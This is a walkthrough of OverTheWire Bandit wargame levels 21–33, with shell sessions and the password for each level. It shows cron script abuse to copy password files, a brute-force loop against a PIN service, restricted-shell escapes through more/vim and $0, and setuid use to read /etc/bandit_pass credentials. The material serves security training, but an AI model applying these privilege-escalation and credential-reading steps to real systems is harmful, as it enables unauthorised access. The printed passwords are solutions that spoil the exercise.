# Over The Wire Wargames - Bandit (21-33)

## Level 21 > Level 22

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

---

```bash
bandit21@bandit:~$ ls -l /etc/cron.d/
total 40
-r--r----- 1 root root  47 Aug 15 13:16 behemoth4_cleanup
-rw-r--r-- 1 root root 123 Aug 15 13:09 clean_tmp
-rw-r--r-- 1 root root 120 Aug 15 13:16 cronjob_bandit22
-rw-r--r-- 1 root root 122 Aug 15 13:16 cronjob_bandit23
-rw-r--r-- 1 root root 120 Aug 15 13:16 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-r--r----- 1 root root  48 Aug 15 13:17 leviathan5_cleanup
-rw------- 1 root root 138 Aug 15 13:17 manpage3_resetpw_job
-rwx------ 1 root root  52 Aug 15 13:19 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat

bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q

bandit21@bandit:~$ exit

$ sshpass -p 'tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q' ssh -p 2220 bandit22@bandit.labs.overthewire.org
```

## Level 22 > Level 23

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.

---

```bash
bandit22@bandit:~$ ls -l /etc/cron.d/
total 40
-r--r----- 1 root root  47 Aug 15 13:16 behemoth4_cleanup
-rw-r--r-- 1 root root 123 Aug 15 13:09 clean_tmp
-rw-r--r-- 1 root root 120 Aug 15 13:16 cronjob_bandit22
-rw-r--r-- 1 root root 122 Aug 15 13:16 cronjob_bandit23
-rw-r--r-- 1 root root 120 Aug 15 13:16 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-r--r----- 1 root root  48 Aug 15 13:17 leviathan5_cleanup
-rw------- 1 root root 138 Aug 15 13:17 manpage3_resetpw_job
-rwx------ 1 root root  52 Aug 15 13:19 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat

bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null

bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
cat /etc/bandit_pass/$myname > /tmp/$mytarget

bandit22@bandit:~$ cd /usr/bin/

bandit22@bandit:/usr/bin$ ./cronjob_bandit23.sh
Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3

bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349

bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

bandit22@bandit:/usr/bin$ exit

$ sshpass -p '0Zf11ioIjMVN551jX3CmStKLYqjk54Ga' ssh -p 2220 bandit23@bandit.labs.overthewire.org
```

## Level 23 > Level 24

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

---

```bash
bandit23@bandit:~$ ls -l /etc/cron.d/
total 40
-r--r----- 1 root root  47 Aug 15 13:16 behemoth4_cleanup
-rw-r--r-- 1 root root 123 Aug 15 13:09 clean_tmp
-rw-r--r-- 1 root root 120 Aug 15 13:16 cronjob_bandit22
-rw-r--r-- 1 root root 122 Aug 15 13:16 cronjob_bandit23
-rw-r--r-- 1 root root 120 Aug 15 13:16 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-r--r----- 1 root root  48 Aug 15 13:17 leviathan5_cleanup
-rw------- 1 root root 138 Aug 15 13:17 manpage3_resetpw_job
-rwx------ 1 root root  52 Aug 15 13:19 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat

bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/b24 && touch /tmp/b24/pass

bandit23@bandit:~$ vi /tmp/b24/my_script.sh
#!/bin/bash
echo "Copying passwordfile etc/bandit_pass/bandit24 to /tmp/b24/pass"
cat /etc/bandit_pass/bandit24 > /tmp/b24/pass

bandit23@bandit:~$ chmod 777 -R /tmp/b24/

bandit23@bandit:~$ ls -ld /tmp/b24/ && ls -l /tmp/b24/
drwxrwxrwx 2 bandit23 bandit23 4096 Sep 18 09:07 /tmp/b24/
total 4
-rwxrwxrwx 1 bandit23 bandit23 129 Sep 18 09:27 my_script.sh
-rwxrwxrwx 1 bandit23 bandit23   0 Sep 18 09:18 pass

bandit23@bandit:~$ cp /tmp/b24/my_script.sh /var/spool/bandit24/foo/

bandit23@bandit:~$ cat /tmp/b24/pass
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

bandit23@bandit:~$ EXIT

$ sshpass -p 'gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8' ssh -p 2220 bandit24@bandit.labs.overthewire.org
```

## Level 24 > Level 25

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

---

```bash
bandit24@bandit:~$ for pin in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin"; done | nc localhost 30002
Wrong! Please enter the correct current password and pincode. Try again.
...
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

bandit24@bandit:~$ exit

$ sshpass -p 'iCi86ttT4KSNe1armKiwbQNmB3YJP3q4' ssh -p 2220 bandit25@bandit.labs.overthewire.org
```

## Level 25 > Level 26

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.

NOTE: if you’re a Windows user and typically use Powershell to ssh into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.

---

```bash
bandit25@bandit:~$ ls
bandit26.sshkey

bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh
export TERM=linux
exec more ~/text.txt
exit 0

# default shell is just a script that uses command more on file text.txt
# we need to make terminal as small as possible so it doesn't immediately show all text so we can use command mode of more

bandit25@bandit:~$ ssh -i bandit26.sshkey -p 2220 bandit26@localhost

# use v to go into vim
# in vim, set default shell to bash
:set shell=/bin/bash
# then enter the shell through vim
:shell

bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ

$ sshpass -p 's0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ' ssh -p 2220 bandit26@bandit.labs.overthewire.org
```

## Level 26 > Level 27

Good job getting a shell! Now hurry and grab the password for bandit27!

---

```bash
bandit26@bandit:~$ ls -l
total 20
-rwsr-x--- 1 bandit27 bandit26 14884 Aug 15 13:16 bandit27-do
-rw-r----- 1 bandit26 bandit26   258 Aug 15 13:16 text.txt

bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB

$ sshpass -p 'upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB' ssh -p 2220 bandit27@bandit.labs.overthewire.org
```

## Level 27 > Level 28

There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.

Clone the repository and find the password for the next level.

---

```bash
$ mktemp -d
/tmp/tmp.ZsBO6lDGOE

bandit27@bandit:~$ cd /tmp/tmp.ZsBO6lDGOE

bandit27@bandit:/tmp/tmp.ZsBO6lDGOE$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
Cloning into 'repo'...
...
bandit27-git@localhost's password:
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
Receiving objects: 100% (3/3), 286 bytes | 286.00 KiB/s, done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0

bandit27@bandit:/tmp/tmp.ZsBO6lDGOE$ ls -l
total 4
drwxrwxr-x 3 bandit27 bandit27 4096 Sep 18 14:00 repo

bandit27@bandit:/tmp/tmp.ZsBO6lDGOE$ cat repo/
.git/   README

bandit27@bandit:/tmp/tmp.ZsBO6lDGOE$ cat repo/README
The password to the next level is: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN

bandit27@bandit:/tmp/tmp.ZsBO6lDGOE$ exit

$ sshpass -p 'Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN' ssh -p 2220 bandit28@bandit.labs.overthewire.org
```

## Level 28 > Level 29

There is a git repository at ssh://bandit28-git@localhost:2220/home/bandit28-git/repo via the port 2220. The password for the user bandit28-git is the same as for the user bandit28.

Clone the repository and find the password for the next level.

---

```bash
bandit28@bandit:~$ mktemp -d
/tmp/tmp.7c5TSZXAmo

bandit28@bandit:~$ cd /tmp/tmp.7c5TSZXAmo

bandit28@bandit:/tmp/tmp.7c5TSZXAmo$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
Cloning into 'repo'...
...
bandit28-git@localhost's password:
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (2/2), done.

bandit28@bandit:/tmp/tmp.7c5TSZXAmo$ cd repo
bandit28@bandit:/tmp/tmp.7c5TSZXAmo/repo$ cat README.md
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx

bandit28@bandit:/tmp/tmp.7c5TSZXAmo/repo$ git log
commit 710c14a2e43cfd97041924403e00efb00b3a956e (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Fri Aug 15 13:16:10 2025 +0000

    fix info leak

bandit28@bandit:/tmp/tmp.7c5TSZXAmo/repo$ git diff 68314e012fbaa192abfc9b78ac369c82b75fab8f
diff --git a/README.md b/README.md
index d4e3b74..5c6457b 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials

 - username: bandit29
-- password: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
+- password: xxxxxxxxxx

bandit28@bandit:/tmp/tmp.7c5TSZXAmo/repo$ exit

$ sshpass -p '4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7' ssh -p 2220 bandit29@bandit.labs.overthewire.org
```

## Level 29 > Level 30

There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.

Clone the repository and find the password for the next level.

---

```bash
bandit29@bandit:~$ mktemp -d
/tmp/tmp.Y3YChfmRu7

bandit29@bandit:~$ cd /tmp/tmp.Y3YChfmRu7

bandit29@bandit:/tmp/tmp.Y3YChfmRu7$ git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
Cloning into 'repo'...
...
bandit29-git@localhost's password:
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 16 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (16/16), done.
Resolving deltas: 100% (2/2), done.

bandit29@bandit:/tmp/tmp.Y3YChfmRu7$ cd repo

bandit29@bandit:/tmp/tmp.Y3YChfmRu7/repo$ ls
README.md

bandit29@bandit:/tmp/tmp.Y3YChfmRu7/repo$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: <no passwords in production!>


bandit29@bandit:/tmp/tmp.Y3YChfmRu7/repo$ git branch -l -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev

bandit29@bandit:/tmp/tmp.Y3YChfmRu7/repo$ git switch dev
branch 'dev' set up to track 'origin/dev'.
Switched to a new branch 'dev'
bandit29@bandit:/tmp/tmp.Y3YChfmRu7/repo$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL

bandit29@bandit:/tmp/tmp.Y3YChfmRu7/repo$ exit

$ sshpass -p 'qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL' ssh -p 2220 bandit30@bandit.labs.overthewire.org

```

## Level 30 > Level 31

There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo via the port 2220. The password for the user bandit30-git is the same as for the user bandit30.

Clone the repository and find the password for the next level.

---

```bash
bandit30@bandit:~$ mktemp -d
/tmp/tmp.w3EslA9N8o

bandit30@bandit:~$ cd /tmp/tmp.w3EslA9N8o

bandit30@bandit:/tmp/tmp.w3EslA9N8o$ git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
Cloning into 'repo'...
...
bandit30-git@localhost's password:
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Total 4 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (4/4), done.

bandit30@bandit:/tmp/tmp.w3EslA9N8o$ ls
repo

bandit30@bandit:/tmp/tmp.w3EslA9N8o$ cd repo/

bandit30@bandit:/tmp/tmp.w3EslA9N8o/repo$ cat README.md
just an epmty file... muahaha

bandit30@bandit:/tmp/tmp.w3EslA9N8o/repo$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/master

bandit30@bandit:/tmp/tmp.w3EslA9N8o/repo$ git tag -l
secret

bandit30@bandit:/tmp/tmp.w3EslA9N8o/repo$ git show secret
fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy

bandit30@bandit:/tmp/tmp.w3EslA9N8o/repo$ exit

$ sshpass -p 'fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy' ssh -p 2220 bandit31@bandit.labs.overthewire.org
```

## Level 31 > Level 32

There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo via the port 2220. The password for the user bandit31-git is the same as for the user bandit31.

Clone the repository and find the password for the next level.

---

```bash
bandit31@bandit:~$ mktemp -d
/tmp/tmp.Sh33DLqaGz

bandit31@bandit:~$ cd /tmp/tmp.Sh33DLqaGz

bandit31@bandit:/tmp/tmp.Sh33DLqaGz$ git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
Cloning into 'repo'...
...
bandit31-git@localhost's password:
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 4 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (4/4), done.

bandit31@bandit:/tmp/tmp.Sh33DLqaGz$ cd repo/ && ls -la
total 24
drwxrwxr-x 3 bandit31 bandit31 4096 Sep 19 06:49 .
drwx------ 3 bandit31 bandit31 4096 Sep 19 06:47 ..
drwxrwxr-x 8 bandit31 bandit31 4096 Sep 19 06:50 .git
-rw-rw-r-- 1 bandit31 bandit31    6 Sep 19 06:47 .gitignore
-rw-rw-r-- 1 bandit31 bandit31    4 Sep 19 06:49 new_file
-rw-rw-r-- 1 bandit31 bandit31  147 Sep 19 06:47 README.md

bandit31@bandit:/tmp/tmp.Sh33DLqaGz/repo$ cat README.md
This time your task is to push a file to the remote repository.
Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

bandit31@bandit:/tmp/tmp.Sh33DLqaGz/repo$ cat .gitignore
*.txt

bandit31@bandit:/tmp/tmp.Sh33DLqaGz/repo$ echo 'May I come in?' > key.txt

bandit31@bandit:/tmp/tmp.Sh33DLqaGz/repo$ cat key.txt
May I come in?

bandit31@bandit:/tmp/tmp.Sh33DLqaGz/repo$ vi .gitignore
bandit31@bandit:/tmp/tmp.Sh33DLqaGz/repo$ cat .gitignore
#*.txt

bandit31@bandit:/tmp/tmp.Sh33DLqaGz/repo$ git status
On branch master
Your branch is ahead of 'origin/master' by 1 commit.
  (use "git push" to publish your local commits)

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        modified:   .gitignore

Untracked files:
  (use "git add <file>..." to include in what will be committed)
        key.txt

bandit31@bandit:/tmp/tmp.Sh33DLqaGz/repo$ git commit -m "Add key.txt"

bandit31@bandit:/tmp/tmp.Sh33DLqaGz/repo$ git push
...
remote: ### Attempting to validate files... ####
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Well done! Here is the password for the next level:
remote: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
...

bandit31@bandit:/tmp/tmp.Sh33DLqaGz/repo$ exit

$ sshpass -p '3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K' ssh -p 2220 bandit32@bandit.labs.overthewire.org
```

## Level 32 > Level 33

After all this git stuff, it’s time for another escape. Good luck!

---

```bash
WELCOME TO THE UPPERCASE SHELL
>> ls
sh: 1: LS: Permission denied
>> vi
sh: 1: VI: Permission denied

>> $0
$ ls -la
total 36
drwxr-xr-x   2 root     root      4096 Aug 15 13:16 .
drwxr-xr-x 150 root     root      4096 Aug 15 13:18 ..
-rw-r--r--   1 root     root       220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root      3851 Aug 15 13:09 .bashrc
-rw-r--r--   1 root     root       807 Mar 31  2024 .profile
-rwsr-x---   1 bandit33 bandit32 15140 Aug 15 13:16 uppershell

$ whoami
bandit33

$ cat /etc/bandit_pass/bandit33
tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0

$ exit
>> ^C

$ sshpass -p 'tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0' ssh -p 2220 bandit33@bandit.labs.overthewire.org
```